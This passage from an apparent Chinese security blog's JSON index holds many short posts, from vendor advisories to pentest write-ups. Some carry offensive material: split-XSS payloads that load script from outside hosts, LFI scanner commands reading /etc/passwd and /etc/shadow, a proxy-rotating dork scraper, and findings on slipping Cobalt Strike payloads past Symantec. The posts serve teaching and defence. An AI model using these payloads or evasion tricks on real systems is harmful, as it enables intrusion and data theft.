你可能会争辩说，在这个玩具示例中，KMS可以跟踪使用计数器，因为它控制着对存储密钥的访问。然而，在实践中，KMS通常在可以加密和解密的数据类型上相当有限(通常只是加密密钥)。例如，加密秘密密钥分片很可能是不可能的。\n","date":"2025-08-02T17:04:02+08:00","permalink":"http://localhost:1313/p/%E7%BF%BB%E8%BD%AC%E6%AF%94%E7%89%B9%E7%9A%84%E8%B8%AA%E8%BF%B9aes-gcm%E5%9C%A8%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E8%87%B4%E5%91%BD%E6%BC%8F%E6%B4%9E/","title":"翻转比特的踪迹：AES-GCM在可信执行环境中的致命漏洞"},{"content":"CVE-2024-27954 - WordPress wp-automatic插件LFI扫描器\r本项目提供了一个基于Python的本地文件包含(LFI)漏洞扫描工具，针对WordPress插件wp-automatic中的关键漏洞CVE-2024-27954。该漏洞允许未经验证的攻击者使用file://注入向量读取服务器上的任意文件。\n🚨 漏洞摘要\rCVE编号: CVE-2024-27954 受影响组件: WordPress wp-automatic插件 影响: 本地文件包含(LFI) 风险: 远程未授权文件读取(如/etc/passwd、配置文件、源代码等) 攻击向量: 使用file://方案的不受信任link参数 🔧 功能特点\r扫描单个或多个目标URL 测试单个或多个LFI文件路径 支持代理(如BurpSuite) 多线程扫描 将易受攻击的目标输出到文件 人性化的控制台输出 📦 环境要求\rPython 3.x requests模块 安装依赖:\n1 pip install requests 🚀 使用方法\r1 python3 CVE-2024-27954.py --url http://目标地址 --lfi-path /etc/passwd 参数 描述 --url 单个目标URL(如http://目标:8080) --list 包含目标URL列表的文件(每行一个) --lfi-path 要测试的单个文件路径(默认:/etc/passwd) --paths-file 包含多个文件路径的文件(每行一个) --proxy 代理设置(如http://127.0.0.1:8080) --output 保存漏洞结果的输出文件 --threads 并发线程数(默认:3) 📂 使用示例\r1 python3 CVE-2024-27954.py --url \u0026#34;http://目标地址\u0026#34; --lfi-path /etc/passwd --proxy \u0026#34;http://127.0.0.1:8080\u0026#34; --output results.txt 1 python3 CVE-2024-27954.py --url \u0026#34;http://目标地址\u0026#34; --lfi-path /etc/shadow --proxy \u0026#34;http://127.0.0.1:8080\u0026#34; --output results.txt ⚠️ 免责声明\r本工具仅用于教育目的和授权渗透测试。未经授权访问系统可能是非法的。请负责任地使用。\n","date":"2025-08-02T16:52:12+08:00","permalink":"http://localhost:1313/p/wordpress-wp-automatic%E6%8F%92%E4%BB%B6lfi%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7cve-2024-27954/","title":"WordPress wp-automatic插件LFI漏洞扫描工具(CVE-2024-27954)"},{"content":"Split XSS - 分割XSS攻击载荷\r突破20字符限制的XSS攻击技术\r在测试一个编辑表单时，我发现8个输入字段都存在XSS漏洞，但每个字段限制为20个字符。常规XSS攻击无法在如此短的字符限制下完成，于是我开发了以下技术：\n基本攻击思路\r在第一个输入中开启\u0026lt;script\u0026gt;标签但不闭合： 1 \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)/* 在后续输入中闭合标签： 1 */\u0026lt;/script\u0026gt; 字符分配策略\r第一个字段：用12个字符闭合输入标签并开始脚本标签，剩余8个字符用于有效载荷 中间字段：每字段16个有效载荷字符（扣除4个字符用于注释标记） 最后字段：9个有效载荷字符（扣除11个字符用于闭合注释和脚本标签） 实际攻击载荷示例\r1 2 3 4 5 6 7 8 \u0026#34;\u0026gt;\u0026lt;script\u0026gt;/* */x=document/* */.createElement(/* */\u0026#34;script\u0026#34;);x./* */src=\u0026#34;//dn.lc/s\u0026#34;;/* */document.head./* */appendChild(x);/* */\u0026lt;/script\u0026gt; 组合XSS技术\r当网站将两个输入字段组合显示时，可以：\n在名字字段注入不完整的脚本标签： 1 abc\u0026lt;script src=\u0026#34;//digi.ninja/script.js\u0026#34; 在姓氏字段注入闭合标签： 1 /\u0026gt; 组合后形成完整标签：\n1 abc\u0026lt;script src=\u0026#34;//digi.ninja/script.js\u0026#34; /\u0026gt; 防御措施\r正确的输出编码是根本解决方案 输入验证可以作为辅助防御层 永远不要信任用户提供的内容 完整测试实验室可在Split XSS Lab获取\n","date":"2025-08-02T16:35:35+08:00","permalink":"http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/","title":"分割XSS攻击载荷：突破20字符限制的技巧"},{"content":"测试背景\r非科学实验表明：uBlock Origin能有效阻止跟踪器发起HTTP GET请求\n测试扩展：无插件 vs Ghostery vs uBlock Origin vs AdBlock Plus\n测试网站首页：CNN vs FoxNews vs MSNBC\n测试方法\r每次测试前清除浏览器缓存 开启新的Burp会话并关闭代理拦截 使用Kali Linux下的Firefox浏览器 CNN测试结果\r无扩展：60秒内产生335次GET请求 Ghostery：132次请求 uBlock Origin：102次请求（触发反广告拦截提示） AdBlock Plus：99次请求（未触发拦截） FoxNews测试结果\r无扩展：265次GET请求 Ghostery：67次请求（部分网站功能异常） uBlock Origin：170次请求 AdBlock Plus：229次请求（拦截效果差） MSNBC测试结果\r无扩展：301次请求 Ghostery：136次请求 uBlock Origin：85次请求 AdBlock Plus：140次请求 结论\r主流广告网络已适应AdBlock Plus的拦截规则 Ghostery提供详细的跟踪器分析数据 uBlock Origin综合表现最佳，能有效阻止： 浏览器指纹采集 用户习惯追踪 操作系统信息泄露 已安装扩展探测 经Panopticlick验证，仅使用uBlock时防追踪效果显著。作者声明支持EFF、DuckDuckGo、uBlock团队、PrivacyBadger和Ghostery开发组。\n","date":"2025-08-02T16:24:37+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8burp%E5%88%86%E6%9E%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E6%8B%A6%E6%88%AA%E6%95%88%E6%9E%9C%E5%AF%B9%E6%AF%94%E6%B5%8B%E8%AF%95/","title":"使用Burp分析浏览器扩展拦截效果对比测试"},{"content":"MS09-012: 修复\u0026quot;令牌劫持\u0026quot;漏洞\r今天早晨我们发布了MS09-012更新，用于修复公开披露的\u0026quot;令牌劫持\u0026quot;漏洞(http://www.argeniss.com/research/TokenKidnapping.pdf)。该漏洞允许从Network Service账户提权至Local System账户。通常情况下，恶意用户不会以Network Service身份运行，除非是像IIS这样的少数程序，可以在以Network Service运行的服务中执行任意代码。这使得攻击者能够攻破并控制Windows系统。\n我是否受影响？\r此问题影响两种情况：在Network Service账户拥有的进程中执行不受信任的代码，或在具有SeImpersonatePrivilege的进程中执行代码。公开讨论的攻击方式是通过托管在IIS工作进程中的恶意Full Trust ASPX代码实现的。\n技术背景\r修复此问题需要微软有史以来最庞大的工程努力之一。本次安全更新涉及：\nWindows内核修改 COM、DCOM和LSASS子系统 WMI和MSDTC内置服务 服务控制管理器(SCM) 我们不得不将Vista和Server 2008中的服务令牌工作大量反向移植到XP和Server 2003。部分最资深的开发人员从Windows 7开发中抽调出来处理此问题。\n修复的四个CVE漏洞\rCVE-2008-1436 (MSDTC)：\n问题：MSDTC在创建RPC连接时请求过多权限 修复：减少RPC连接时的权限请求 CVE-2009-0079 (RPCSS)：\n问题：Network Service账户下运行服务的权限问题 修复：移植Vista的Service SID功能 CVE-2009-0080 (线程池)：\n问题：线程创建时的权限验证不足 修复：强化线程访问权限 CVE-2009-0078 (WMI)：\n问题：WMI运行Network Service和Local Service提供程序时缺乏保护 修复：采用基于Vista Service SID技术的WMI SID保护机制 未来方向\rWindows 7和Server 2008 R2将引入\u0026quot;托管服务账户\u0026quot;功能，提供更灵活的解决方案：\n允许服务运行为独立账户 提供自动密码管理功能 简化域SPN远程认证流程 本文内容\u0026quot;按原样\u0026quot;提供，不提供任何担保，也不授予任何权利。\nNick Finco, MSRC工程团队 ","date":"2025-08-02T16:13:46+08:00","permalink":"http://localhost:1313/p/ms09-012%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D%E4%BB%A4%E7%89%8C%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"MS09-012补丁：修复\"令牌劫持\"漏洞的技术解析"},{"content":"こんにちは、村木ゆりかです。 今回は、マイクロソフト セキュリティ アドバイザリ 3062591 でお知らせしましたツール Local Administrator Password Solution (LAPS) についてご紹介します。\nLocal Administrator Password Solution (LAPS) とは?\rこのツールは、Active Directory (AD) に参加しているコンピューターの、ローカル管理者アカウントのパスワードを AD にて管理することができる無償のツールです。\n攻撃者が組織に侵入する際、マルウェアなどを利用してまずはひとつのドメイン端末に侵入し、その後、Pass the Hash などの手法で同一のパスワードが設定されているその他のドメイン端末へ侵入を試みるなど、徐々に認証サーバーへ侵入するのに必要な高い権限を取得保持している可能性の高いアプリケーション・サービスを狙います。企業ではマスター イメージから複製展開する手法や、ヘルプデスク業務の効率化のために端末毎の管理者アカウントが同一になることが多く、このような場合は、一台がマルウェア感染すると他のすべての端末が侵害される可能性が高くなります。このように侵害を広げていく場合、脆弱性は不要であり、正規の認証を行い、正規の方法で不正なファイルが仕掛けられます。このような組織への侵入を阻止するためには、端末ごとの管理者アカウント パスワードの使い回しをしないことが重要になります。\nこの LAPS ツールを利用する事で、ドメイン端末のローカル管理者アカウントのパスワードをランダムなものにし、管理を行うことができます。これにより、万が一組織内への攻撃者の侵入があった場合でも、組織内への攻撃の広がりや侵入拡大を防ぐためのセキュリティを強化することができます。\nLAPS でのパスワード更新と管理\rLAPS を利用することで、各ドメイン端末のローカル管理者アカウントに、自動でランダムなパスワードを設定・定期的に更新し、AD に保存することができます。また、特定の端末のローカル管理者アカウントのパスワードをリセットするなどの管理を行うことができます。もちろん、既定の Administrator 以外のローカル管理者アカウントも管理可能です。\nLAPS は AD 環境でグループ ポリシーを利用して管理でき、端末から AD へパスワードを保存する際には、Kerberos V5 のプロトコルを利用し、AES で暗号化しており、AD に保存されたパスワードの情報は、特定の権限を持ったユーザーでないと閲覧することができないよう ACL で管理することができます。\nLocal Administrator Password Solution (LAPS) の入手\rLAPS ツールは、ダウンロード センターから入手できます。 利用方法や展開方法、アーキテクチャを説明したドキュメント (英語) も、同時にダウンロードできます。 また、Ignite イベントで行われたセッションで LAPS ツールの説明やデモが行われています。ぜひ、ビデオをチェックしてみてください。\n","date":"2025-08-02T16:02:32+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%8F%91%E5%B8%83%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88laps%E5%B7%A5%E5%85%B7/","title":"微软发布本地管理员密码解决方案(LAPS)工具"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 #!/usr/bin/env python3 import os import time import random import argparse from concurrent.futures import ThreadPoolExecutor, as_completed from bs4 import BeautifulSoup import requests from termcolor import colored def get_proxies(): proxies = [] if not os.path.exists(\u0026#34;proxies.txt\u0026#34;): url = \u0026#34;https://api.proxyscrape.com/v2/?request=getproxies\u0026amp;protocol=http\u0026amp;timeout=10000\u0026amp;country=all\u0026amp;ssl=all\u0026amp;anonymity=all\u0026amp;limit=5000\u0026#34; proxies = requests.get(url).text.split(\u0026#34;\\n\u0026#34;) with open(\u0026#34;proxies.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;\\n\u0026#34;.join(proxies)) else: with open(\u0026#34;proxies.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: proxies = f.read().split(\u0026#34;\\n\u0026#34;) return proxies def test_proxy(proxy, user_agent, verbose): test_url = \u0026#34;https://bing.com\u0026#34; headers = {\u0026#34;User-Agent\u0026#34;: user_agent} try: proxies = {\u0026#34;http\u0026#34;: f\u0026#34;http://{proxy}\u0026#34;, \u0026#34;https\u0026#34;: f\u0026#34;http://{proxy}\u0026#34;} response = requests.get(test_url, headers=headers, proxies=proxies, timeout=3) print(colored(f\u0026#34;Scraping good proxies...\u0026#34;, \u0026#34;blue\u0026#34;)) if response.status_code == 200: print(colored(f\u0026#34;Good proxy found: {proxy}\u0026#34;, \u0026#34;green\u0026#34;)) return True except requests.exceptions.ConnectTimeout: if verbose: print(colored(f\u0026#34;Connection timeout for proxy: {proxy}\u0026#34;, \u0026#34;red\u0026#34;)) except requests.exceptions.ProxyError: if verbose: print(colored(f\u0026#34;Proxy error for proxy: {proxy}\u0026#34;, \u0026#34;red\u0026#34;)) except requests.exceptions.RequestException as e: if verbose: print(colored(f\u0026#34;Request exception for proxy: {proxy}, error: {e}\u0026#34;, \u0026#34;red\u0026#34;)) return False def filter_working_proxies(proxies, user_agents, verbose): working_proxies = [] user_agent = random.choice(user_agents) with ThreadPoolExecutor(max_workers=50) as executor: futures_to_proxies = {executor.submit(test_proxy, proxy, user_agent, verbose): proxy for proxy in proxies} for future in as_completed(futures_to_proxies): if future.result(): working_proxies.append(futures_to_proxies[future]) return working_proxies def get_user_agents(): with open(\u0026#34;useragents.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: return f.read().split(\u0026#34;\\n\u0026#34;) def google_search(query, user_agent, proxy): url = f\u0026#34;https://www.google.com/search?q={query}\u0026#34; headers = {\u0026#34;User-Agent\u0026#34;: user_agent} proxies = {\u0026#34;http\u0026#34;: f\u0026#34;http://{proxy}\u0026#34;, \u0026#34;https\u0026#34;: f\u0026#34;http://{proxy}\u0026#34;} response = requests.get(url, headers=headers, proxies=proxies, timeout=10) soup = BeautifulSoup(response.text, \u0026#34;html.parser\u0026#34;) return [result[\u0026#34;href\u0026#34;] for result in soup.select(\u0026#34;.yuRUbf a\u0026#34;)] def search_dork(dork, proxies, user_agents, verbose, max_retries=3, backoff_factor=1.0): print(colored(f\u0026#34;Searching for dork: {dork}\u0026#34;, \u0026#34;yellow\u0026#34;)) def try_search_dork(dork, proxy, user_agent): try: results = google_search(dork, user_agent, proxy) return results except requests.exceptions.RequestException as e: if verbose: print(colored(f\u0026#34;Error with proxy {proxy}: {e}, rotating proxy...\u0026#34;, \u0026#34;magenta\u0026#34;)) return None retries = 0 while retries \u0026lt;= max_retries: proxy = random.choice(proxies) user_agent = random.choice(user_agents) results = try_search_dork(dork, proxy, user_agent) if results is not None: if results: with open(f\u0026#34;results/{dork}_results.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;\\n\u0026#34;.join(results[:20])) print(colored(f\u0026#34;Saved top 20 results for dork \u0026#39;{dork}\u0026#39;\u0026#34;, \u0026#34;green\u0026#34;)) else: print(colored(f\u0026#34;No results found for dork \u0026#39;{dork}\u0026#39;\u0026#34;, \u0026#34;red\u0026#34;)) break retries += 1 time.sleep(backoff_factor * (2 ** (retries - 1)) + random.uniform(1, 5)) def main(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-v\u0026#34;, \u0026#34;--verbose\u0026#34;, help=\u0026#34;Display errors with proxies.\u0026#34;, action=\u0026#34;store_true\u0026#34;) args = parser.parse_args() dorks = [] with open(\u0026#34;dorks.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: dorks = f.read().split(\u0026#34;\\n\u0026#34;) user_agents = get_user_agents() proxies = filter_working_proxies(get_proxies(), user_agents, args.verbose) if not os.path.exists(\u0026#34;results\u0026#34;): os.makedirs(\u0026#34;results\u0026#34;) with ThreadPoolExecutor(max_workers=20) as executor: futures = {executor.submit(search_dork, dork, proxies, user_agents, args.verbose): dork for dork in dorks} for future in as_completed(futures): future.result() if __name__ == \u0026#34;__main__\u0026#34;: main() ","date":"2025-08-02T15:51:22+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0google-dork-ssl%E7%BB%95%E8%BF%87%E8%87%AA%E5%8A%A8%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/","title":"使用Python实现Google Dork SSL绕过自动搜索技术"},{"content":"SharePoint XSS漏洞\r今天我们发布了安全公告983438，向客户通报SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。以下是该漏洞的详细技术分析。\n攻击向量分析\r公告指出该漏洞可能导致SharePoint站点内的权限提升(EoP)。需要特别说明的是，这种权限提升并非从普通用户到工作站或服务器环境的管理员用户，而是攻击者可以在用户的SharePoint会话上下文中执行恶意脚本。最可能的攻击场景是：攻击者向已登录SharePoint服务器的用户发送恶意链接，当用户点击该链接时，攻击者嵌入的JavaScript将在点击者的用户上下文中执行。\n缓解措施\rSharePoint使用Http-Only cookies进行身份验证。由于HttpOnly cookies无法通过脚本访问，这显著降低了XSS攻击风险。更多信息请参考《使用HTTP-only Cookies缓解跨站脚本攻击》。\nIE8的XSS过滤器在Internet区域默认启用，能拦截此类XSS攻击，因此IE8用户面临的风险较低。但该过滤器在本地Intranet区域默认禁用，可通过以下UI界面启用：\n[图片：IE8 XSS过滤器启用界面]\n管理员也可以通过组策略为任何区域启用或禁用XSS过滤器，详见《组策略与Internet Explorer 8》。\n临时解决方案\r我们建议通过服务器端ACL设置限制help.aspx文件的访问。启用此方案后，您将无法查看SharePoint站点内的帮助内容。实施此缓解措施的用户可访问以下英文帮助内容作为替代： http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx\nJonathan Ness, David Ross和Chengyun Chu，MSRC工程团队 本文按\u0026quot;原样\u0026quot;提供，不作任何担保，也不授予任何权利。\n","date":"2025-08-02T15:40:04+08:00","permalink":"http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/","title":"SharePoint XSS漏洞技术分析与缓解措施"},{"content":"Atlassian Confluence Server和Data Center关键零日漏洞\r软件公司Atlassian于6月2日发布公告，披露一个此前未知的关键漏洞(CVE-2022-26134)，即所谓的零日漏洞。该漏洞影响Atlassian Confluence Server和Confluence Data Center所有受支持版本。根据Atlassian声明，Atlassian Cloud不受影响。荷兰国家网络安全中心(NCSC-NL)发布公告将该漏洞评级为高/高风险。目前尚无可用补丁。\n该漏洞允许未经认证的攻击者远程执行代码并访问系统范围内的敏感信息。虽然Atlassian仍需确认最早受影响版本，但很可能所有版本均存在漏洞。目前公开渠道尚未出现概念验证代码。\n据发现该漏洞的安全公司Volexity称，此漏洞极易被利用。Volexity已确认存在有限范围内的漏洞利用活动。\n缓解措施\rAtlassian正在为受支持版本开发补丁(计划于太平洋时间6月3日下班前发布)。NCSC-NL建议补丁发布后立即安装。同时，Atlassian建议采取以下临时措施降低风险：\n限制从互联网访问Confluence Server和Data Center实例 或完全禁用Confluence Server和Data Center实例直至补丁发布 若无法实施上述措施，可部署Web应用防火墙(WAF)规则拦截包含${的URL以降低风险 建议实施网络监控 Volexity已共享入侵指标(IOC)和YARA规则。NCSC-NL建议尽可能实施这些缓解措施，各组织需自行评估这些措施对业务流程的影响。NCSC-NL将持续监控情况并在官网更新相关信息。\n","date":"2025-08-02T15:29:09+08:00","permalink":"http://localhost:1313/p/atlassian-confluence-server%E5%92%8Cdata-center%E5%85%B3%E9%94%AE%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E%E8%AD%A6%E6%8A%A5/","title":"Atlassian Confluence Server和Data Center关键零日漏洞警报"},{"content":"专题讨论：当开源狩猎遇上对抗模拟\rBlack Hills信息安全公司（BHIS）集结了开源软件（OSS）狩猎和对抗模拟领域的顶尖开发者，共同探讨当前技术格局与未来趋势。本次网络研讨会由Atomic Purple Team的Jordan Drysdale和PlumHound的Kent Ickler主持，特邀以下核心开发者参与：\nRoberto Rodriguez (@Cyb3rWard0g) 与 Nate Guagenti (@neu5ron)：HELK项目核心维护者，专注Mordor数据集、Azure资源管理器模板开发 Marcello Salvati (@byt3bl33d3r)：CrackMapExec和SILENTTRINITY开发者 John Strand (@strandjs)：对抗模拟领域资深专家 关键技术议题\r威胁情报共享体系（00:14:26）\n探讨Mordor Labs标准化威胁数据集的构建（01:10:05） 演示如何通过Jupyter Notebook分析Windows攻击日志（https://mordordatasets.com/notebooks/small/windows/windows.html） HELK威胁分析平台（01:12:42）\n基于ELK堆栈的扩展架构 集成攻击技战术知识库（MITRE ATT\u0026amp;CK） 对抗模拟工具链\nCrackMapExec在内网渗透中的实战应用 SILENTTRINITY后期利用框架设计 威胁狩猎实战手册（01:18:41）\n开源威胁研究（Open Threat Research）方法论 攻击模式识别与防御策略（00:50:57） 资源索引\rMordor项目GitHub HELK实时分析平台 威胁狩猎Playbook Jupyter安全分析手册 完整幻灯片下载：BHIS技术白皮书\n加入技术社区：BHIS Discord\n","date":"2025-08-02T15:13:06+08:00","permalink":"http://localhost:1313/p/%E5%BC%80%E6%BA%90%E7%8B%A9%E7%8C%8E%E4%B8%8E%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E7%9A%84%E7%A2%B0%E6%92%9Ehelkmordor%E4%B8%8Ecrackmapexec%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"开源狩猎与对抗模拟的碰撞：HELK、Mordor与CrackMapExec技术解析"},{"content":"移动数据网络基础\r在移动数据网络中，设备位置信息至关重要。例如荷兰KPN运营商拥有约5000个基站，每个基站通过小区标识符（CI）和路由区域码（RAC）进行管理。国际移动用户标识（IMSI）、接入点名称（APN）和SIM卡存储的通用集成电路卡（UICC）是网络接入的核心要素。数据包传输需经过服务GPRS支持节点（SGSN）、网关GPRS支持节点（GGSN）等组件，并通过GPRS隧道协议（GTP）建立专用通信隧道（基于UDP的GTPv0/v1/v2协议）。\nGRX网络的安全价值\r当设备漫游时，运营商通过GRX网络将流量路由至归属国网关。研究团队发现：\n数据暴露风险：通过自定义脚本剥离GTP头部后，可解析出明文流量（含用户凭证）； 位置追踪：GTP头部包含MCC（国家代码）、MNC（运营商代码）、LAC（位置区号）等元数据，结合IMEI分析可精确定位设备； 网络隔离失效：扫描显示GRX网络中存在大量暴露的SMTP/FTP/Telnet服务（含老旧漏洞版本），42K主机中有5.5K可直接从互联网访问。 渗透测试方法论\r团队采用\u0026quot;杀伤链\u0026quot;模型对GRX网络进行审计：\nBGP路由分析：识别4.8K子网（320K IP地址）； 大规模扫描：使用zmap探测GTP服务（UDP 2152/2123端口）； 模拟攻击：通过SGSNEMU工具伪造GGSN连接，建立虚假PDP上下文； 服务枚举：发现运营商DNS服务器多运行老旧BIND版本（存在DoS漏洞）。 防御建议\r运营商应：\n从BGP表中移除GRX前缀 实施BGP认证与入口过滤 严格限制AS号间的路由前缀交换 应用最小权限访问控制列表（仅允许GTP/DNS/ICMP） 案例关联：比利时电信（Belgacom）被黑事件表明，攻击者可能通过社工管理员而非外部漏洞获取GRX访问权限，凸显内部威胁防护的重要性。\n","date":"2025-08-02T15:02:00+08:00","permalink":"http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"揭秘GRX网络与间谍活动：移动数据安全漏洞分析"},{"content":"基于我们的安全审计经验，我们发现Burp Suite Professional的动态分析能够发现隐藏在各种目标组件中的漏洞。像竞态条件这类不可预测的安全问题，仅通过检查源代码往往难以捕捉。\n虽然Burp是全面的Web应用安全测试工具，但其丰富功能可能构成使用门槛。为此，Trail of Bits在测试手册中新增了Burp Suite指南章节，旨在简化复杂性，提供清晰简洁的操作路径，帮助用户快速获得实际成果。\n新章节首先探讨Burp的核心应用场景，深入解析其如何提升安全测试能力——特别是在面对前端代码混淆、复杂基础设施组件、部署环境差异或客户端数据处理等挑战时。\n章节提供逐步配置指南，帮助您快速高效地为特定应用设置Burp，最大程度减少配置错误，确保潜在漏洞不被遗漏，这将显著改变您的安全审计效果。我们还探讨如何利用关键Burp扩展来增强应用测试流程，发现更多漏洞。\n最后章节提供大量专业技巧，助您掌握高级实践，发掘Burp的隐藏特性，这些都可能彻底改变您的安全测试工作流程。\n实战知识，实战成果\r测试手册系列凝结了我们丰富的实战经验。这些见解超越简单文档复述，提供Trail of Bits团队从安全审计实践中验证过的策略。\n通过这个新章节，我们希望赋予您所需的知识和信心，真正释放Burp Suite保护Web应用的潜力。\n准备好用Burp Suite增强您的安全测试了吗？立即阅读新章节。\n[分享至 Twitter][LinkedIn][GitHub][Mastodon][Hacker News]\n","date":"2025-08-02T14:40:48+08:00","permalink":"http://localhost:1313/p/%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C%E6%96%B0%E5%A2%9Eburp-suite%E4%B8%93%E4%B8%9A%E7%89%88%E7%AB%A0%E8%8A%82-%E6%8F%90%E5%8D%87web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/","title":"测试手册新增Burp Suite专业版章节 - 提升Web应用安全测试效率"},{"content":"Abstract Factory pattern\r工厂模式一直是构建应用程序的关键模式，它简单、高效且直击要点。当开始学习面向设计的方法构建应用或API时，我总是推荐将工厂模式作为设计中的关键切入点。今天我要讨论的是抽象工厂模式。它并不是你称之为模式的\u0026quot;抽象\u0026quot;类或对象，而是工厂的工厂——这正是它被称为\u0026quot;抽象\u0026quot;的原因。\u0026ldquo;抽象\u0026quot;类的存在只是这个模式的另一个侧面。\n何时使用抽象工厂模式\r需要独立于产品的创建、组合和表现方式时 需要对作为组使用的产品实施强制约束时 需要仅暴露产品接口而不暴露其实现细节时 实现方案\r以下是我的实现计划：\nHas A关系：\n产品(Product)拥有规格(Specification) 工厂(Factory)拥有产品(Product) 工厂管理器(FactoryManager)拥有工厂(Factory) 工厂管理器(FactoryManager)拥有计算机工厂(ComputerFactory) Is A关系：\nB工厂是计算机工厂 A工厂是计算机工厂 (图中未显示)产品A是产品 产品B是产品 代码实现\r基础抽象工厂类\r1 2 3 4 5 public abstract class ComputerFactory { public abstract String getName(); public abstract Product[] getProducts(); public abstract Product getProduct(int ProductID); } 具体工厂实现\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class AFactory extends ComputerFactory { public String getName(){ return \u0026#34;A\u0026#34;; } public Product[] getProducts(){ return null; } public Product getProduct(int productID){ switch(productID){ case 1: return new ProductA(); case 2: return new ProductB(); default: throw new IllegalArgumentException(\u0026#34;Sorry you hit the wrong factory, we closed down in 1600 BC\u0026#34;); } } } 工厂常量定义\r1 2 3 4 public interface FactoryConstants { public int A = 1; public int B = 2; } 工厂管理器（单例实现）\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class FactoryManager{ private static FactoryManager factoryManager = null; private FactoryManager(){} public static FactoryManager getInstance(){ if(factoryManager != null){ return factoryManager; } else return factoryManager = new FactoryManager(); } public ComputerFactory getFactory(int factory) throws IllegalArgumentException{ switch(factory){ case FactoryConstants.A: return new IBMFactory(); case FactoryConstants.B: return new SUNFactory(); default: throw new IllegalArgumentException(\u0026#34;Sorry you hit the wrong factory, we closed down in 1600 BC\u0026#34;); } } } 测试主方法\r1 2 3 4 5 public static void main(String args[]){ System.out.println(FactoryManager.getInstance().getFactory(FactoryConstants.A).getName()); System.out.println(FactoryManager.getInstance().getFactory(FactoryConstants.B).getName()); System.out.println(FactoryManager.getInstance().getFactory(3).getName()); } 完整代码清单可在原文链接查看。\n","date":"2025-08-02T14:30:01+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%9E%84%E5%BB%BA%E7%81%B5%E6%B4%BB%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84/","title":"深入解析抽象工厂模式：构建灵活可扩展的软件架构"},{"content":"C2基础设施构建\r红队测试中，Cobalt Strike因其团队协作特性成为理想攻击平台。通过Digital Ocean虚拟机搭建包含以下要素的基础设施：\n定制域名系统 成熟域名仿冒亚马逊流量 支持DNS/HTTP/HTTPS多通道 使用自动化脚本生成威胁模拟配置文件（HTTPsC2DoneRight.sh） 赛门铁克防护机制分析\r测试环境采用最新版赛门铁克端点防护，主要防御层包括：\n基于主机的入侵防御系统(HIPS) 磁盘可执行文件签名检测 进程创建管道中的ACT shim检测 内存shellcode检测 载荷测试方案设计\r为规避检测设计三种测试场景：\n基础HTTP监听：无定制配置的80端口监听 亚马逊流量伪装：使用自动化脚本生成的标准配置 定制化伪装：修改关键参数的亚马逊配置 关键发现\r32位载荷：全部触发IPS警报并被阻断 64位载荷： 基础HTTP配置成功建立会话 标准亚马逊配置在第二阶段GET请求时被TCP重置（无用户告警） 修改数字参数的定制配置成功绕过（GET请求中167-3294888-0262949改为全8） 技术结论\r64位内存注入shellcode仍具高成功率 HIPS未检测第二阶段shellcode传递 公开的威胁模拟技术易被特定签名阻断 